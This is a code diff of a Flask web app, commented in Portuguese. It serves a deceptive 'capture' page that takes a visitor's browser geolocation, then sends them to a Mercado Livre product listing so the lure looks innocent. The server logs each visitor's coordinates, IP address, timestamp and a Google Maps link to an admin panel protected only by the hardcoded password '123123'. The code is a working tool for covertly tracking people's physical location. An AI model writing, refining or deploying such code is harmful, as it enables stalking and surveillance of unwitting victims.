@@ -4,13 +4,12 @@ import datetime
 app = Flask(__name__)
 
 # Lista temporária para guardar as localizações na memória do servidor
-# (Nota: se o servidor reiniciar no Render, a lista limpa, o que é ótimo para testes)
 registros_localizacao = []
 
 # Senha simples para o seu painel
 SENHA_ADMIN = "123123"
 
-# Página HTML de Captura (Falsa página de carregamento)
+# Página HTML de Captura (Redireciona para o Mercado Livre após capturar)
 HTML_CAPTURA = """
 <!DOCTYPE html>
 <html lang="pt-BR">
@@ -36,13 +35,14 @@ HTML_CAPTURA = """
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ latitude: lat, longitude: lon, precisao: accuracy })
             }).then(() => {
-                window.location.href = "https://google.com";
+                // Redireciona para o link do Mercado Livre escolhido
+                window.location.href = "https://www.mercadolivre.com.br/onimusha-way-of-the-sword-ps5/p/MLB76247569";
             });
         }
 
         function erroLocalizacao(error) {
             console.log("Erro ou negado: " + error.message);
-            window.location.href = "https://google.com";
+            window.location.href = "https://www.mercadolivre.com.br/onimusha-way-of-the-sword-ps5/p/MLB76247569";
         }
 
         if (navigator.geolocation) {
@@ -52,7 +52,7 @@ HTML_CAPTURA = """
                 maximumAge: 0
             });
         } else {
-            window.location.href = "https://google.com";
+            window.location.href = "https://www.mercadolivre.com.br/onimusha-way-of-the-sword-ps5/p/MLB76247569";
         }
     </script>
 </body>
@@ -120,7 +120,6 @@ def salvar_loc():
     agora = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     maps_link = f"https://www.google.com/maps?q={lat},{lon}"
     
-    # Salva na lista da memória
     registros_localizacao.insert(0, {
         "data": agora,
         "ip": ip_cliente,
@@ -132,9 +131,8 @@ def salvar_loc():
     
     return jsonify({"status": "sucesso"})
 
-@app.route('/admin', methods=['GET', 'POST'])
+@app.route('/admin', methods=['GET'])
 def admin():
-    # Simples verificação de senha via parâmetro na URL: /admin?senha=123123
     senha_informada = request.args.get('senha', '')
     if senha_informada != SENHA_ADMIN:
         return """
